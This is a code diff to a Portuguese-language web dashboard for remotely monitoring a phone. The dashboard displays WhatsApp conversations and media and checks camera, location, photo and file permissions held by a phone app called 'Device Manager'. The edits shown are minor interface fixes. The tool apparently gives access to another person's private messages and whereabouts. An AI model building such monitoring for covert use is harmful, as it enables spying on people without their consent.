@@ -91,7 +91,7 @@ html[data-theme=claro] .card{box-shadow:0 1px 2px rgba(20,30,60,.04)}
 .sim .tx b{display:block;font-size:14.5px}.sim .tx span{font-size:12.5px;color:var(--mu)}
 .perm{display:flex;gap:12px;align-items:center;padding:11px 0;border-bottom:1px solid var(--line)}.perm:last-child{border-bottom:0}
 .perm .s{width:30px;height:30px;border-radius:9px;display:grid;place-items:center;flex:none;font-size:15px}
-.perm .s.ok{background:color-mix(in srgb,var(--ok) 15%,transparent)}.perm .s.no{background:color-mix(in srgb,var(--wa) 15%,transparent)}
+.perm .s.ok{background:color-mix(in srgb,var(--ok) 15%,transparent)}.perm .s.no{background:color-mix(in srgb,var(--wa) 15%,transparent)}.perm .s.dk{background:color-mix(in srgb,var(--mu) 15%,transparent)}
 .perm b{display:block;font-size:13.5px}.perm span{font-size:12px;color:var(--mu)}
 /* ecrã */
 .live{display:grid;grid-template-columns:minmax(0,1fr) 360px;gap:22px;align-items:start}
@@ -1609,7 +1609,7 @@ async function carregarWa(){
     const r=await get('/wa-convs');
     WA_CONVS=r.lista||[];
     const ativo=r.ativo;
-    document.getElementById('waPerm').hidden=ativo;
+    document.getElementById('waPerm').hidden=ativo!==false;
     const nMsng=WA_CONVS.filter(c=>c.pacote==='com.whatsapp').length;
     const nBiz=WA_CONVS.filter(c=>c.pacote==='com.whatsapp.w4b').length;
     let st='';
@@ -1734,7 +1734,7 @@ function pintarWaMsgs(){
       const lbl=WA_TIPO_LBL[tipo]||tipo;
       const legenda=m.texto&&m.texto!==lbl?'<div class="txt" style="font-size:12px;color:var(--mu);margin-top:2px">'+esc(m.texto)+'</div>':'';
       if(m.mediaPath){
-        const src='/wa-file?p='+encodeURIComponent(m.mediaPath)+'&k='+encodeURIComponent(CODE);
+        const src=U('/wa-file')+'?p='+encodeURIComponent(m.mediaPath)+'&k='+encodeURIComponent(CODE);
         if(tipo==='imagem'||tipo==='sticker'){
           conteudo='<img class="wa-media-img" src="'+src+'" loading="lazy" alt="'+lbl+'" onclick="window.open(this.src)">'+legenda;
         } else if(tipo==='video'){
@@ -2092,7 +2092,7 @@ let ADVS={};
 $('#permRef').onclick=()=>{$('#advPerm').textContent='A verificar…';advEstado()};
 async function advEstado(){try{const s=await (await fetch(advUrl('/adv-state'),{cache:'no-store'})).json();ADVS=s;
  $('#alarmeOn').disabled=!!s.alarme;$('#alarmeOff').disabled=!s.alarme;
- const linha=(ok,nome,ajuda)=>`<div class="perm"><span class="s ${ok?'ok':'no'}">${ok?'✓':'!'}</span><div><b>${nome}</b><span>${ok?'Concedida':('Em falta — '+ajuda)}</span></div></div>`;
+ const linha=(ok,nome,ajuda)=>{const st=ok===true?'ok':ok===false?'no':'dk';const lbl=ok===true?'Concedida':ok===false?('Em falta — '+ajuda):'Não verificado (telemóvel offline?)';return`<div class="perm"><span class="s ${st}">${ok===true?'✓':ok===false?'!':'?'}</span><div><b>${nome}</b><span>${lbl}</span></div></div>`;};
  $('#advPerm').innerHTML=linha(s.camara,'Câmara','app Device Manager › permissão Câmara')+linha(s.local,'Localização','app Device Manager › permissão Localização (e ligue o GPS)')+linha(s.fotos,'Fotos / galeria','app Device Manager › permissão Fotos')+linha(s.ficheiros,'Todos os ficheiros','app Device Manager › «Todos os ficheiros»');
  const faltam=[s.camara,s.local,s.fotos,s.ficheiros].filter(x=>x===false).length;
  $('#permDica').innerHTML=faltam?('⚠️ No telefone, abra a app Device Manager e toque em cada permissão a vermelho até ficar ✔. Depois, aqui, toque em <b>↻ Atualizar</b>.'):'✅ Todas concedidas.';
